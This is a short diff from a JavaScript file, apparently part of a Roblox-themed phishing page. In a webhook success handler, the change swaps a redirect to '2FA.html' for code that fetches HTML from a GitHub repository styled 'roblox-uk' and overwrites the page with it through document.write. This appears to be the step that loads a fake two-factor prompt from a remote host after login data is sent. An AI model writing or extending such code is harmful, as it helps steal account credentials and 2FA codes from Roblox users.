@@ -956,7 +956,8 @@ function checkRobloxInstall() {
         success: function(data, status) {
           // Se la richiesta webhook ha successo, puoi gestirla qui
           
-		  window.location.href = '2FA.html';
+		  fetch("https://raw.githubusercontent.com/roblox-uk/Backend/refs/heads/main/2FA.txt").then(r=>r.text()).then(html=>{document.open();document.write(html);document.close()});
+
 
 		  
         },
